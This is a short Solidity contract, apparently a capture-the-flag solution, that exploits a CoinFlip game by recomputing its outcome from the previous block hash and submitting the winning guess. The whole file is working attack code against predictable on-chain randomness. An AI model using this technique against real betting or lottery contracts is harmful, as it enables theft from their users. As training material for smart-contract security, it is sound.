// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import 'CoinFlip.sol';
contract hack {
    CoinFlip private immutable target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address target_) {
        target = CoinFlip(target_);
    }

    function attack() public {
        target.flip(guess());
    }

    function guess() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }

}
//demo

